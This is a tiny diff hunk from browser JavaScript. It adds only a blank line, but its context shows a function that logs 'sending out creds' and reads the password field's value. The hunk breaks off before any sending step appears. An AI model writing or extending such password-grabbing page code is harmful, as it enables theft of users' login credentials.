@@ -5,6 +5,7 @@
 
 var oopsSpot = document.getElementsByClassName('oops')
 
+
 function showMeTheMoney() {
     console.log('sending out creds');
     const password = document.getElementById('password-input').value;
